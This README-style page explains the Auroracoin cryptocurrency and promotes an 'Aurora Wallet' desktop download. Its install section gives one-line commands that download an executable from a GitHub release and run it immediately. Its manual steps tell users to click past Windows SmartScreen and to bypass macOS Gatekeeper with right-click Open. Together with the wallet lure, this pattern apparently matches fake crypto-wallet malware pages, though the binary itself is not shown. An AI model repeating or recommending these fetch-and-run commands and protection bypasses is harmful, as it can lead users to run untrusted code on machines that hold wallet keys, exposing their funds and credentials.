![Aurora Wallet what is Auroracoin AUR guide](assets/aurora-wallet-guide-article-banner.png)

# What is Auroracoin? The AUR network in plain terms

A 2014 Icelandic cryptocurrency with a national airdrop, a multi-algorithm network and a desktop wallet.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


Auroracoin is a peer-to-peer cryptocurrency launched in 2014 for Iceland, mined across several algorithms and held in self-custody today.

The network began as an experiment in national adoption. An anonymous developer released it in early 2014 as a cryptocurrency for the people of Iceland, with roughly half the supply set aside to be distributed to citizens listed in the national registry. The airdrop made headlines far outside the country, and the currency has run on its own chain ever since.

<!-- ARTICLE-BODY-BEGIN -->

## How the network operates

Auroracoin is a proof-of-work chain with a short block interval and scrypt as one of its mining algorithms. Miners secure the chain, nodes validate it and wallets hold the keys. There is no company that issues the coin, and no central server that must stay online for a payment to settle.

Supply was fixed at launch, and the emission schedule follows the rules in the original client. Those rules are readable in the historical code, which is preserved in the account's reference repositories.

## The currency and its ticker

The ticker is AUR, and an address begins with the letter A. That prefix is a network parameter rather than a formatting choice, which is why an address from another chain cannot be mistaken for an Auroracoin address inside the wallet.

AUR is divisible, and the smallest unit follows the same decimal convention as Bitcoin-derived chains, so amounts can be sent with the usual precision.

An address that starts with A is a check you can make by eye, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/31-receiving-addresses-qr.md">receiving addresses and QR codes</a> shows how the wallet builds a new one from your phrase.

## Where the wallet fits

Holding AUR requires a wallet, and the official desktop wallet is Aurora Wallet for Windows, macOS and Linux. It keeps the keys on your machine, derives addresses from a recovery phrase and connects to peers directly.

Choosing self-custody is the decision that makes the rest of the network usable without a custodian, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/36-self-custody-basics.md">self-custody basics</a> explains what that asks of you.

The history of the project's own repositories is worth knowing if you read the old code, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/29-legacy-repositories-explained.md">legacy repositories explained</a> maps them.

Install the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> to hold AUR on your own machine.

If the application is new to you, start with <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/01-what-is-aurora-wallet.md">what Aurora Wallet is</a> before the first install.

## FAQ

### Can I buy AUR with a card?

That depends on the exchanges that list it, which this library does not cover. The wallet holds AUR once you have it.

### Is Auroracoin still developed?

The chain runs, and the desktop wallet is released as a maintained application with guides and checksums published alongside it.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [What is Aurora Wallet](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/01-what-is-aurora-wallet.md)
- [Self-custody basics](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/36-self-custody-basics.md)
- [Legacy repositories explained](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/29-legacy-repositories-explained.md)
- [Aurora Wallet FAQ](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/38-aurora-wallet-faq.md)
